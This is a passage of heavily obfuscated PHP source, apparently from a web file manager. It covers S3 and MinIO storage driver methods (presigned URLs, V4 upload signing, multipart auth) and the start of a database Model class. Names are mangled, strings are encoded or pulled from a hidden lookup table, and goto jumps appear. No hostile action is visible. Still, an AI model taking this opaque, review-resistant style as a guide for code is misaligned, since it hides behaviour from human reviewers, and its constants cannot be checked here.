$³Ñœû£°[0][$½¿ÛÅ®[32]] != $Ò®±æ¶¼) { return !0; } } } else { if (!empty($ µÑ†×—)) { return !0; } } if ($×ÂğÕ·å === null) { break; } } if ($¬ŸËäºÒ) { $³èİİ™Ÿ = array_diff($³èİİ™Ÿ, array($Ò®±æ¶¼)); $³èİİ™Ÿ = count(array_unique($³èİİ™Ÿ)); $éîİ¢° = count(array_unique($éîİ¢°)); return array($½¿ÛÅ®[241] => $³èİİ™Ÿ, $½¿ÛÅ®[242] => $éîİ¢°); } return !1; } public function listAll($Çæƒ±ê) { $îßúõ†ü =& $_SERVER[™¸œØ®Ü]; $ß¾å³€¿ = $this->fileList($Çæƒ±ê, $îßúõ†ü[12], !0); $ÏäÆ“ˆÏ = array_to_keyvalue($ß¾å³€¿[$îßúõ†ü[86]], $îßúõ†ü[32]); foreach ($ß¾å³€¿[$îßúõ†ü[85]] as $˜Œüªïá) { if (is_string($˜Œüªïá)) { $ÏäÆ“ˆÏ[$˜Œüªïá] = array($îßúõ†ü[79] => 0); } } return $this->listAllFiles($Çæƒ±ê, $ÏäÆ“ˆÏ); } public function canRead($›Öøİæ²) { $òîî½Õ =& $_SERVER[™¸œØ®Ü]; $×èØŠƒÛ = $this->client->getAccessControlPolicy($this->bucket, $›Öøİæ²); if (!$×èØŠƒÛ) { return !1; } return in_array($×èØŠƒÛ, array($òîî½Õ[243], $òîî½Õ[244], $òîî½Õ[245])) ? !0 : !1; } public function canWrite($ãˆ…Õ¹¿) { $å´ŸÁÀô =& $_SERVER[™¸œØ®Ü]; $Å£¬‹« = $this->client->getAccessControlPolicy($this->bucket, $ãˆ…Õ¹¿); if (!$Å£¬‹«) { return !1; } return in_array($Å£¬‹«, array($å´ŸÁÀô[243], $å´ŸÁÀô[244])) ? !0 : !1; } public function getContent($öï—´¯Ù) { return $this->client->getObject($this->bucket, $öï—´¯Ù); } public function setContent($ÚÑ•„Å, $Ì‘¹àŸ = '', $£Œíş¶ = false) { $ÓùÄêºì =& $_SERVER[™¸œØ®Ü]; $ÚÑ•„Å = $£Œíş¶ ? trim($ÚÑ•„Å, $ÓùÄêºì[8]) . $ÓùÄêºì[8] : $ÚÑ•„Å; $÷¨¨ô†Õ = get_file_mime(get_path_ext($ÚÑ•„Å)); $©ÙĞşÄ = $this->client->putObject($Ì‘¹àŸ, $this->bucket, $ÚÑ•„Å, $ÓùÄêºì[231], array(), $÷¨¨ô†Õ); if (!$©ÙĞşÄ) { return !1; } if ($£Œíş¶) { return !0; } return $©ÙĞşÄ ? !0 : !1; } public function fileSubstr($™‹ß‹Çç, $€¹×ã²ı, $ºğÆÖıı) { $€®É¢¹¶ = $€¹×ã²ı + $ºğÆÖıı - 1; return $this->client->getObject($this->bucket, $™‹ß‹Çç, array($_SERVER[™¸œØ®Ü][246] => "\x62\x79\164\145\x73\x3d{$€¹×ã²ı}\55{$€®É¢¹¶}")); } public function upload($›ŠŞïòª, $Ÿ½ÃÉ¹, $Îƒ‘ï÷¸ = false, $¶Ø•¼ÔÜ = REPEAT_REPLACE) { $˜³ÕÍ¤ =& $_SERVER[™¸œØ®Ü]; $Éêæ—´“ = array($˜³ÕÍ¤[247] => @md5_file($Ÿ½ÃÉ¹)); $ÛŸá¬½ = array($˜³ÕÍ¤[248] => get_file_mime(get_path_ext($›ŠŞïòª))); if (IO::size($Ÿ½ÃÉ¹) <= 1024 * 1024 * 200) { $ÙÏÎ¢±° = $this->client->putObjectFile($Ÿ½ÃÉ¹, $this->bucket, $›ŠŞïòª, $˜³ÕÍ¤[231], $Éêæ—´“, $ÛŸá¬½); return !empty($ÙÏÎ¢±°) ? $this->getPathOuter($›ŠŞïòª) : !1; } $éâ·¡Œš = $this->client->multiUploadObject($Ÿ½ÃÉ¹, $this->bucket, trim($›ŠŞïòª, $˜³ÕÍ¤[8]), $Éêæ—´“, $ÛŸá¬½); return $éâ·¡Œš ? $this->getPathOuter($›ŠŞïòª) : !1; } public function download($×Ù²ºÜÍ, $Ú­Ü¿óò) { if (!@is_dir($this->pathFather($Ú­Ü¿óò)) && !IO::mkdir($this->pathFather($Ú­Ü¿óò))) { return !1; } $¹õÏÍ = $this->client->getObject($this->bucket, $×Ù²ºÜÍ, array(), $Ú­Ü¿óò); return $¹õÏÍ !== !1 ? $Ú­Ü¿óò : !1; } public function link($¡Í©è¼, $ø´¸şõ = array()) { return $this->getPreSignedURL($¡Í©è¼, 3600 * 12, $ø´¸şõ); } private function getPreSignedURL($˜Œ–ôû¸, $öáƒÅ¶«, $¹ş¯¥“Â = array(), $ÌÏ¸ü× = "\x47\105\x54") { $é©“ƒ÷ä =& $_SERVER[™¸œØ®Ü]; $˜Œ–ôû¸ = trim($˜Œ–ôû¸, $é©“ƒ÷ä[8]); if ($this->signVer == $é©“ƒ÷ä[249]) { return $this->client->getPreSignedV2URL($this->bucket, $˜Œ–ôû¸, $öáƒÅ¶«, $ÌÏ¸ü×, $¹ş¯¥“Â); } return $this->client->getPreSignedV4URL($this->bucket, $˜Œ–ôû¸, $öáƒÅ¶«, array(), $ÌÏ¸ü×, $¹ş¯¥“Â); } public function fileOut($¾Óùİ’±, $ÓÙæòÅ  = false, $ı×¼º´¨ = false, $…•ƒçª¡ = '') { $Øá¹ÑÛù =& $_SERVER[™¸œØ®Ü]; if ($this->isFileOutServer()) { return $this->fileOutServer($¾Óùİ’±, $ÓÙæòÅ , $ı×¼º´¨, $…•ƒçª¡); } if (!$ı×¼º´¨) { $ı×¼º´¨ = $this->pathThis($¾Óùİ’±); } $Ê¹ƒŠ† = get_file_mime(get_path_ext($ı×¼º´¨)); if ($Ê¹ƒŠ† == $Øá¹ÑÛù[250]) { return parent::fileOut($¾Óùİ’±, $ÓÙæòÅ , $ı×¼º´¨, $…•ƒçª¡); } $¤¯€íì¥ = array($Øá¹ÑÛù[251] => $Ê¹ƒŠ†); if ($ÓÙæòÅ ) { $¤¯€íì¥[$Øá¹ÑÛù[252]] = $Øá¹ÑÛù[253] . rawurlencode($ı×¼º´¨); } else { } $ûñè“º‹ = $this->link($¾Óùİ’±, $¤¯€íì¥); $this->fileOutLink($ûñè“º‹); } public function fileOutServer($‰¼ÀØ£, $˜Ïü†İ = false, $£Ğùí…Û = false, $ÏØæ¿à = '') { parent::fileOut($‰¼ÀØ£, $˜Ïü†İ, $£Ğùí…Û, $ÏØæ¿à); } public function fileOutImageServer($‰“‡¼ø, $°™ò“Şƒ = 250) { parent::fileOutImage($‰“‡¼ø, $°™ò“Şƒ); } public function hashMd5($ˆèÈÎˆ†, $Ş¿Â·¾ = '') { $ÂÑ÷ŒŒã = $this->objectMeta($ˆèÈÎˆ†); if (!$ÂÑ÷ŒŒã) { return !1; } $Ş¿Â·¾ = $Ş¿Â·¾ ? $Ş¿Â·¾ : _get($ÂÑ÷ŒŒã, $_SERVER[™¸œØ®Ü][254]); return $Ş¿Â·¾; } public function uploadFormData($Áù™æ—è, $äšæØœ = 3600) { $•ÈÚ¦ŸÒ =& $_SERVER[™¸œØ®Ü]; if (!$this->_isClientAsync()) { $ ÏÛû¯ = $this->getPreSignedURL($Áù™æ—è, $äšæØœ, array(), $•ÈÚ¦ŸÒ[255]); return array($•ÈÚ¦ŸÒ[208] => str_replace($•ÈÚ¦ŸÒ[218], $•ÈÚ¦ŸÒ[256], $ ÏÛû¯)); } if (isset($GLOBALS[$•ÈÚ¦ŸÒ[6]][$•ÈÚ¦ŸÒ[92]][$•ÈÚ¦ŸÒ[257]]) && $GLOBALS[$•ÈÚ¦ŸÒ[6]][$•ÈÚ¦ŸÒ[92]][$•ÈÚ¦ŸÒ[257]] == $•ÈÚ¦ŸÒ[230]) { return $this->uploadMultiData($Áù™æ—è, $äšæØœ); } if ($this->signVer == $•ÈÚ¦ŸÒ[249]) { return $this->uploadFormDataV2($Áù™æ—è, $äšæØœ); } return $this->uploadFormDataV4($Áù™æ—è, $äšæØœ); } public function uploadFormDataV2($Å‹€ó·¿, $ññÛš¼´ = 3600) { $„¢«¯ó¡ =& $_SERVER[™¸œØ®Ü]; $¸Ó ˆ‰ = $this->pathFather($Å‹€ó·¿); $¥ æ¹”û = $this->client->getHttpUploadPostParams($this->bucket, $¸Ó ˆ‰, $„¢«¯ó¡[231], $ññÛš¼´); $¯Ëâ”™ = array_merge((array) $¥ æ¹”û, array($„¢«¯ó¡[258] => $„¢«¯ó¡[249], $„¢«¯ó¡[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($¯Ëâ”™[$„¢«¯ó¡[258]]); } return $¯Ëâ”™; } public function uploadFormDataV4($ÚòÓ›€, $æÆÒÚŒ€ = 3600) { $ñšÙ¥Åû =& $_SERVER[™¸œØ®Ü]; $Î‡ˆì€È = $ñšÙ¥Åû[231]; $Œ—Ñ‚ˆå = $ñšÙ¥Åû[259]; $¤˜×ï = $ñšÙ¥Åû[62]; $Æõ ÌÌ = gmdate($ñšÙ¥Åû[260]); $¢Ç”á = gmdate($ñšÙ¥Åû[261]); $™ÖçÜ¿¾ = $ñšÙ¥Åû[262]; $ÅíÙË‡ö = $æÆÒÚŒ€ . $ñšÙ¥Åû[12]; $øö–¨íÕ = $ñšÙ¥Åû[263]; $éš–şÖ¦ = array($this->accessKey, $¢Ç”á, $this->region, $¤˜×ï, $™ÖçÜ¿¾); $Ãğôºñ = implode($ñšÙ¥Åû[8], $éš–şÖ¦); $ï–öü¤› = array($ñšÙ¥Åû[264] => gmdate($ñšÙ¥Åû[265], strtotime($ñšÙ¥Åû[266])), $ñšÙ¥Åû[267] => array(array($ñšÙ¥Åû[268] => $this->bucket), array($ñšÙ¥Åû[269], $ñšÙ¥Åû[270], $ñšÙ¥Åû[12]), array($ñšÙ¥Åû[269], $ñšÙ¥Åû[271], $ñšÙ¥Åû[12]), array($ñšÙ¥Åû[272] => $øö–¨íÕ), array($ñšÙ¥Åû[273] => $Ãğôºñ), array($ñšÙ¥Åû[274] => $Œ—Ñ‚ˆå), array($ñšÙ¥Åû[275] => $Æõ ÌÌ), array($ñšÙ¥Åû[276] => $ÅíÙË‡ö))); $Şæ˜îîš = base64_encode(json_encode($ï–öü¤›)); $¬¾Ûé = hash_hmac($ñšÙ¥Åû[277], $¢Ç”á, $ñšÙ¥Åû[278] . $this->secret, !0); $µ¨‡Éí¯ = hash_hmac($ñšÙ¥Åû[277], $this->region, $¬¾Ûé, !0); $°èÊšœ¿ = hash_hmac($ñšÙ¥Åû[277], $¤˜×ï, $µ¨‡Éí¯, !0); $ßÕ†şÇÁ = hash_hmac($ñšÙ¥Åû[277], $™ÖçÜ¿¾, $°èÊšœ¿, !0); $ é÷è±’ = hash_hmac($ñšÙ¥Åû[277], $Şæ˜îîš, $ßÕ†şÇÁ); $ïœ§Â‰å = array($ñšÙ¥Åû[248] => $ñšÙ¥Åû[12], $ñšÙ¥Åû[272] => $øö–¨íÕ, $ñšÙ¥Åû[279] => $Şæ˜îîš, $ñšÙ¥Åû[273] => $Ãğôºñ, $ñšÙ¥Åû[274] => $Œ—Ñ‚ˆå, $ñšÙ¥Åû[275] => $Æõ ÌÌ, $ñšÙ¥Åû[276] => $ÅíÙË‡ö, $ñšÙ¥Åû[280] => $ é÷è±’, $ñšÙ¥Åû[258] => $ñšÙ¥Åû[249], $ñšÙ¥Åû[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($ïœ§Â‰å[$ñšÙ¥Åû[258]]); } return $ïœ§Â‰å; } public function uploadMultiData($¼ø‡‚¢, $µ¡¼Øƒ = 3600) { $®Ü›â¸” =& $_SERVER[™¸œØ®Ü]; $Ëß®‰¼Ş = $this->signVer == $®Ü›â¸”[249] ? gmdate($®Ü›â¸”[281]) : gmdate($®Ü›â¸”[282]); $ê²•Ç¡š = array(); $•ã¡•†â = $this->client->getUploadId($this->bucket, $¼ø‡‚¢, $ê²•Ç¡š); if (!$•ã¡•†â) { return !1; } $—ÓŠ™áã = array($®Ü›â¸”[283] => $•ã¡•†â, $®Ü›â¸”[208] => $this->getHost() . $®Ü›â¸”[8] . $this->pathEncode($¼ø‡‚¢), $®Ü›â¸”[284] => $Ëß®‰¼Ş, $®Ü›â¸”[97] => $¼ø‡‚¢, $®Ü›â¸”[258] => $this->signVer); if ($this->_isClientAsync()) { unset($—ÓŠ™áã[$®Ü›â¸”[258]]); } return $—ÓŠ™áã; } public function uploadMultiAuth($ ñÆÜÃŞ, $¿©äõÒ¦ = array()) { $ú¢ƒŸÄ =& $_SERVER[™¸œØ®Ü]; if ($this->signVer == $ú¢ƒŸÄ[249]) { if (isset($¿©äõÒ¦[$ú¢ƒŸÄ[285]])) { return $this->uploadPartAuthV2($ ñÆÜÃŞ, $¿©äõÒ¦); } return $this->uploadListAuthV2($ ñÆÜÃŞ, $¿©äõÒ¦); } if (isset($¿©äõÒ¦[$ú¢ƒŸÄ[285]])) { return $this->uploadPartAuthV4($ ñÆÜÃŞ, $¿©äõÒ¦); } return $this->uploadListAuthV4($ ñÆÜÃŞ, $¿©äõÒ¦); } public function uploadPartAuthV2($Ø’Ñç…™, $©£í¯œÕ = array()) { $ò†× »É =& $_SERVER[™¸œØ®Ü]; $µç´ìÕ© = $©£í¯œÕ[$ò†× »É[97]]; $Ë³éÆôÓ = gmdate($ò†× »É[281]); $˜×—ğÕæ = array_intersect_key($©£í¯œÕ, array_flip(array($ò†× »É[285], $ò†× »É[283]))); ksort($˜×—ğÕæ); $¾ÍÂÄø = $˜×—ğÕæ ? $ò†× »É[76] . http_build_query($˜×—ğÕæ, null, $ò†× »É[286], PHP_QUERY_RFC3986) : $ò†× »É[12]; $¿íé‡ñ = array($ò†× »É[255], $ò†× »É[12], $ò†× »É[123], $ò†× »É[12], "\170\55\x61\155\172\55\144\141\164\145\72{$Ë³éÆôÓ}", $ò†× »É[8] . $this->bucket . $ò†× »É[8] . $this->pathEncode($µç´ìÕ©) . $¾ÍÂÄø); $‚£‹ÌıÂ = implode($ò†× »É[287], $¿íé‡ñ); $ÂµÓÍ¦ = $this->client->__getSignature($‚£‹ÌıÂ); return array($ò†× »É[288] => $ÂµÓÍ¦, $ò†× »É[284] => $Ë³éÆôÓ); } public function uploadListAuthV2($ˆ“·¶êğ, $„èÙÅü“ = array()) { $åÎº¡Ìª =& $_SERVER[™¸œØ®Ü]; $üÖÌÀÙ“ = $„èÙÅü“[$åÎº¡Ìª[97]]; $Ë¨ä©İü = $„èÙÅü“[$åÎº¡Ìª[283]]; $šåÕ´ù = $this->client->listParts($this->bucket, $üÖÌÀÙ“, $Ë¨ä©İü); if (!$šåÕ´ù) { return !1; } $œºÖõ„‚ = gmdate($åÎº¡Ìª[281]); $Ç©ÇèÙÒ = $åÎº¡Ìª[289] . $Ë¨ä©İü; $§Ëí¼å = array($åÎº¡Ìª[290], $åÎº¡Ìª[12], $åÎº¡Ìª[123], $åÎº¡Ìª[12], "\x78\x2d\141\x6d\172\55\x64\x61\x74\145\x3a{$œºÖõ„‚}", $åÎº¡Ìª[8] . $this->bucket . $åÎº¡Ìª[8] . $this->pathEncode($üÖÌÀÙ“) . $Ç©ÇèÙÒ); $Ş­å½Ë = implode($åÎº¡Ìª[287], $§Ëí¼å); $ïéÚ¥´³ = $this->client->__getSignature($Ş­å½Ë); return array($åÎº¡Ìª[288] => $ïéÚ¥´³, $åÎº¡Ìª[284] => $œºÖõ„‚, $åÎº¡Ìª[291] => $šåÕ´ù); } public function uploadPartAuthV4($Ñ“ÓŞ’, $…–õÄì = array()) { $·ã«ÇÃ± =& $_SERVER[™¸œØ®Ü]; $¿ø„è¨¢ = $…–õÄì[$·ã«ÇÃ±[97]]; $«â†›óµ = array($·ã«ÇÃ±[275] => gmdate($·ã«ÇÃ±[282]), $·ã«ÇÃ±[292] => _get($…–õÄì, $·ã«ÇÃ±[293], hash($·ã«ÇÃ±[277], $·ã«ÇÃ±[12]))); $œĞ°½õ¶ = explode($·ã«ÇÃ±[210], $this->getHost()); $ÇÏš³©Æ = array($·ã«ÇÃ±[294] => $œĞ°½õ¶[1], $·ã«ÇÃ±[295] => $·ã«ÇÃ±[12], $·ã«ÇÃ±[248] => $·ã«ÇÃ±[123], $·ã«ÇÃ±[296] => $…–õÄì[$·ã«ÇÃ±[79]]); $¨ä°€Ô = $·ã«ÇÃ±[255]; $ÆóÂ¼Áø = $·ã«ÇÃ±[8] . $this->pathEncode($¿ø„è¨¢); $®ÆÁşô = array_intersect_key($…–õÄì, array_flip(array($·ã«ÇÃ±[285], $·ã«ÇÃ±[283]))); $ĞãºàÜ = $this->client->__getSignatureV4($«â†›óµ, $ÇÏš³©Æ, $¨ä°€Ô, $ÆóÂ¼Áø, $®ÆÁşô); return array($·ã«ÇÃ±[288] => $ĞãºàÜ, $·ã«ÇÃ±[292] => $«â†›óµ[$·ã«ÇÃ±[292]], $·ã«ÇÃ±[284] => $«â†›óµ[$·ã«ÇÃ±[275]]); } public function uploadListAuthV4($Ú¾È…Ö, $šæé¬¼ = array()) { $ñàòèÀˆ =& $_SERVER[™¸œØ®Ü]; $ö»ÍÎ›Á = $šæé¬¼[$ñàòèÀˆ[97]]; $ùÉû‹¶î = $šæé¬¼[$ñàòèÀˆ[283]]; $û–œ¼¯§ = $this->client->listParts($this->bucket, $ö»ÍÎ›Á, $ùÉû‹¶î); if (!$û–œ¼¯§) { return !1; } $õÁ¸õïÏ = $ñàòèÀˆ[297]; foreach ($û–œ¼¯§ as $Í¦µÔ«¾) { $õÁ¸õïÏ .= $ñàòèÀˆ[298] . "\x3c\120\x61\162\x74\116\x75\x6d\142\x65\x72\76{$Í¦µÔ«¾[$ñàòèÀˆ[299]]}\74\57\120\141\x72\164\x4e\x75\x6d\x62\145\x72\76\12" . "\74\x45\124\141\147\76{$Í¦µÔ«¾[$ñàòèÀˆ[300]]}\x3c\x2f\105\x54\141\x67\x3e\12" . $ñàòèÀˆ[301]; } $õÁ¸õïÏ .= $ñàòèÀˆ[302]; $äİ£ÁîÊ = array($ñàòèÀˆ[275] => gmdate($ñàòèÀˆ[282]), $ñàòèÀˆ[292] => hash($ñàòèÀˆ[277], $õÁ¸õïÏ)); $™ü›Ò­İ = explode($ñàòèÀˆ[210], $this->getHost()); $€Îğ—Š = array($ñàòèÀˆ[294] => $™ü›Ò­İ[1], $ñàòèÀˆ[248] => $ñàòèÀˆ[123], $ñàòèÀˆ[296] => strlen($õÁ¸õïÏ)); $÷¿£éú = $ñàòèÀˆ[290]; $‹³×ÕÃ = $ñàòèÀˆ[8] . $this->pathEncode($ö»ÍÎ›Á); $®ëòƒº = array($ñàòèÀˆ[283] => $ùÉû‹¶î); $¶ôƒ’”á = $this->client->__getSignatureV4($äİ£ÁîÊ, $€Îğ—Š, $÷¿£éú, $‹³×ÕÃ, $®ëòƒº); return array($ñàòèÀˆ[288] => $¶ôƒ’”á, $ñàòèÀˆ[292] => $äİ£ÁîÊ[$ñàòèÀˆ[292]], $ñàòèÀˆ[284] => $äİ£ÁîÊ[$ñàòèÀˆ[275]], $ñàòèÀˆ[291] => $û–œ¼¯§); } private function _isClientAsync() { $º´ãó½ô =& $_SERVER[™¸œØ®Ü]; static $’Ÿ†›Ëù = null; if ($’Ÿ†›Ëù === null) { $şúßûÚ” = isset($_REQUEST[$º´ãó½ô[303]]) ? json_decode($_REQUEST[$º´ãó½ô[303]], !0) : !1; $’Ÿ†›Ëù = $şúßûÚ” && _get($şúßûÚ”, $º´ãó½ô[304]) == $º´ãó½ô[305]; } return $’Ÿ†›Ëù; } public function getHost() { $ß£†Êœ =& $_SERVER[™¸œØ®Ü]; $ş˜ê³û = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ß£†Êœ[70], $ß£†Êœ[64], $ß£†Êœ[69], $ß£†Êœ[62]))) { return $ş˜ê³û . $ß£†Êœ[8] . $this->bucket; } if ($this->osType == $ß£†Êœ[62] && !is_domain($ş˜ê³û)) { return $ş˜ê³û . $ß£†Êœ[8] . $this->bucket; } $ş˜ê³û = explode($ß£†Êœ[210], $ş˜ê³û); return $ş˜ê³û[0] . $ß£†Êœ[210] . $this->bucket . $ß£†Êœ[10] . $ş˜ê³û[1]; } public function size($ÜËòÎıÑ) { $“ÄÈıòú = $this->objectMeta($ÜËòÎıÑ); return $“ÄÈıòú ? $“ÄÈıòú[$_SERVER[™¸œØ®Ü][79]] : 0; } public function info($±Ñ‘ëìÌ) { if ($this->isFolder($±Ñ‘ëìÌ)) { return $this->folderInfo($±Ñ‘ëìÌ); } else { if ($this->isFile($±Ñ‘ëìÌ)) { return $this->fileInfo($±Ñ‘ëìÌ); } } return !1; } public function exist($å½ÕŠº) { return $this->isFile($å½ÕŠº) || $this->isFolder($å½ÕŠº); } public function isFile($ìİ¡Úµß) { return !$this->isFolder($ìİ¡Úµß) && $this->objectMeta($ìİ¡Úµß); } public function isFolder($»©­Äôî) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][179], $»©­Äôî); } protected function objectMeta($Úè­Õ¥) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][181], $Úè­Õ¥); } protected function _objectMeta($£‡“‰‰§) { $¿üäœ™Ğ =& $_SERVER[™¸œØ®Ü]; $£‡“‰‰§ = rtrim($£‡“‰‰§, $¿üäœ™Ğ[8]); try { $‰ú½¹€± = $this->client->getObjectInfo($this->bucket, $£‡“‰‰§); if (!isset($‰ú½¹€±[$¿üäœ™Ğ[254]]) && isset($‰ú½¹€±[$¿üäœ™Ğ[306]])) { $‰ú½¹€±[$¿üäœ™Ğ[254]] = $‰ú½¹€±[$¿üäœ™Ğ[306]]; } } catch (Exception $ËÛ§³) { $‰ú½¹€± = !1; } if (!$‰ú½¹€±) { } return $‰ú½¹€±; } protected function _isFolder($Ã¹Áî“¥) { $àÁëÍ°¤ =& $_SERVER[™¸œØ®Ü]; $Ã¹Áî“¥ = rtrim($Ã¹Áî“¥, $àÁëÍ°¤[8]) . $àÁëÍ°¤[8]; if ($Ã¹Áî“¥ == $àÁëÍ°¤[12] || $Ã¹Áî“¥ == $àÁëÍ°¤[8]) { return !0; } $ï•ıÙÊÃ = $this->client->getBucket($this->bucket, $Ã¹Áî“¥, null, 1); if (empty($ï•ıÙÊÃ[$àÁëÍ°¤[238]])) { return !1; } $ÙÏß£„ò = $ï•ıÙÊÃ[$àÁëÍ°¤[238]][0][$àÁëÍ°¤[32]]; return stripos($ÙÏß£„ò, $Ã¹Áî“¥) === 0 ? !0 : !1; if (substr($ÙÏß£„ò, -1) == $àÁëÍ°¤[8]) { return !0; } if (get_path_this($ÙÏß£„ò) == get_path_this($Ã¹Áî“¥)) { return !1; } return !0; } public function listObject($ş¡†šã—) { return $this->fileList($ş¡†šã—, $_SERVER[™¸œØ®Ü][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ó»ƒÊÅ) { $øŠú¨Ÿ =& $_SERVER[™¸œØ®Ü]; parent::__construct($Ó»ƒÊÅ); $this->setSignVersion($øŠú¨Ÿ[249]); if (!$this->region) { $this->region = $øŠú¨Ÿ[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ãÂÕÏËœ = $this->getBktRegion(); return $this->region == $ãÂÕÏËœ ? !0 : !1; } public function uploadFormData($şÀ­ÅÑ±, $ÜÓÎÍ²ñ = 3600) { $ğ°¡ñÒ =& $_SERVER[™¸œØ®Ü]; $ëõÎ†Á = $ğ°¡ñÒ[231]; $€µµˆŒü = $ğ°¡ñÒ[259]; $¾ûœ¥ïè = $ğ°¡ñÒ[62]; $”Àºœçœ = gmdate($ğ°¡ñÒ[260]); $ù·×–Ê’ = gmdate($ğ°¡ñÒ[261]); $š‰ÌÌĞ = $ğ°¡ñÒ[262]; $Ü³š”Ë = $ÜÓÎÍ²ñ . $ğ°¡ñÒ[12]; $»Õ£¬Úö = $ğ°¡ñÒ[263]; $áı»úéÁ = array($this->accessKey, $ù·×–Ê’, $this->region, $¾ûœ¥ïè, $š‰ÌÌĞ); $¨Ø‡ŸÅ = implode($ğ°¡ñÒ[8], $áı»úéÁ); $ŠŸ¬óƒ“ = array($ğ°¡ñÒ[264] => gmdate($ğ°¡ñÒ[265], strtotime($ğ°¡ñÒ[266])), $ğ°¡ñÒ[267] => array(array($ğ°¡ñÒ[268] => $this->bucket), array($ğ°¡ñÒ[308] => $ëõÎ†Á), array($ğ°¡ñÒ[269], $ğ°¡ñÒ[270], $ğ°¡ñÒ[12]), array($ğ°¡ñÒ[269], $ğ°¡ñÒ[271], $ğ°¡ñÒ[12]), array($ğ°¡ñÒ[269], $ğ°¡ñÒ[309], $ğ°¡ñÒ[12]), array($ğ°¡ñÒ[272] => $»Õ£¬Úö), array($ğ°¡ñÒ[273] => $¨Ø‡ŸÅ), array($ğ°¡ñÒ[274] => $€µµˆŒü), array($ğ°¡ñÒ[275] => $”Àºœçœ), array($ğ°¡ñÒ[276] => $Ü³š”Ë))); $‹ÉÏÁ¶É = base64_encode(json_encode($ŠŸ¬óƒ“)); $°Ò”É€ = hash_hmac($ğ°¡ñÒ[277], $ù·×–Ê’, $ğ°¡ñÒ[278] . $this->secret, !0); $É×ì” = hash_hmac($ğ°¡ñÒ[277], $this->region, $°Ò”É€, !0); $º›”€ê¿ = hash_hmac($ğ°¡ñÒ[277], $¾ûœ¥ïè, $É×ì”, !0); $ÈÂ£‘Î— = hash_hmac($ğ°¡ñÒ[277], $š‰ÌÌĞ, $º›”€ê¿, !0); $Âø±œÒ = hash_hmac($ğ°¡ñÒ[277], $‹ÉÏÁ¶É, $ÈÂ£‘Î—); $úŠÓàúÖ = array($ğ°¡ñÒ[248] => $ğ°¡ñÒ[12], $ğ°¡ñÒ[296] => $ğ°¡ñÒ[12], $ğ°¡ñÒ[308] => $ëõÎ†Á, $ğ°¡ñÒ[272] => $»Õ£¬Úö, $ğ°¡ñÒ[279] => $‹ÉÏÁ¶É, $ğ°¡ñÒ[310] => $¨Ø‡ŸÅ, $ğ°¡ñÒ[311] => $€µµˆŒü, $ğ°¡ñÒ[312] => $”Àºœçœ, $ğ°¡ñÒ[313] => $Ü³š”Ë, $ğ°¡ñÒ[314] => $Âø±œÒ, $ğ°¡ñÒ[208] => $this->getHost()); return $úŠÓàúÖ; } } goto eã„ÓÖ¨¸Ê; fÅ›ª¢ÔÅõ: define($_SERVER[™¸œØ®Ü][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\x6f\162\144\145\x72", "\141\x6c\x69\141\x73", "\x68\x61\x76\151\156\147", "\x67\x72\157\x75\160", "\x6c\157\x63\153", "\x64\x69\163\164\x69\x6e\143\x74", "\141\165\164\x6f", "\x66\x69\x6c\164\145\162", "\166\141\x6c\x69\144\x61\x74\145", "\x72\145\x73\165\x6c\x74", "\x62\x69\x6e\144", "\164\157\x6b\145\156"); public function __construct($ë›ÈÇ© = '', $ÍùÎÅØ = '', $Ñº–ğıÌ = '') { $Ú•æòƒ =& $_SERVER[™¸œØ®Ü]; $this->_initialize(); if (!empty($ë›ÈÇ©)) { if (strpos($ë›ÈÇ©, $Ú•æòƒ[10])) { list($this->dbName, $this->name) = explode($Ú•æòƒ[10], $ë›ÈÇ©); } else { $this->name = $ë›ÈÇ©; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ÍùÎÅØ)) { $this->tablePrefix = $Ú•æòƒ[12]; } elseif ($Ú•æòƒ[12] != $ÍùÎÅØ) { $this->tablePrefix = $ÍùÎÅØ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ú•æòƒ[323]); } $this->db(0, empty($this->connection) ? $Ñº–ğıÌ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ªı„–Í± =& $_SERVER[™¸œØ®Ü]; if (empty($this->fields)) { if (think_config($ªı„–Í±[324])) { $ƒÇÑîÙë = $this->dbName ? $this->dbName : think_config($ªı„–Í±[325]); $ƒ¬Ñà¾° = think_var_cache($ªı„–Í±[326] . strtolower(get_path_this($ƒÇÑîÙë) . $ªı„–Í±[10] . $this->name)); if ($ƒ¬Ñà¾°) { $±ªõ²İã = think_config($ªı„–Í±[327]); if (empty($±ªõ²İã) || $ƒ¬Ñà¾°[$ªı„–Í±[328]] == $±ªõ²İã) { $this->fields = $ƒ¬Ñà¾°; return; } } } $this->flush(); } } public function flush() { $ğÄ½ùÀ¿ =& $_SERVER[™¸œØ®Ü]; $this->db->setModel($this->name); $ÂßÍƒ¯ = $this->db->getFields($this->getTableName()); if (!$ÂßÍƒ¯) { return !1; } $this->fields = array_keys($ÂßÍƒ¯); $this->fields[$ğÄ½ùÀ¿[329]] = !1; foreach ($ÂßÍƒ¯ as $ÊŞ‡ ¬§ => $¶š¡éñá) { $æò»¾¨[$ÊŞ‡ ¬§] = $¶š¡éñá[$ğÄ½ùÀ¿[33]]; if ($¶š¡éñá[$ğÄ½ùÀ¿[39]]) { $this->fields[$ğÄ½ùÀ¿[330]] = $ÊŞ‡ ¬§; if ($¶š¡éñá[$ğÄ½ùÀ¿[42]]) { $this->fields[$ğÄ½ùÀ¿[329]] = !0; } } } $this->fields[$ğÄ½ùÀ¿[331]] = $æò»¾¨; if (think_config($ğÄ½ùÀ¿[327])) { $this->fields[$ğÄ½ùÀ¿[328]] = 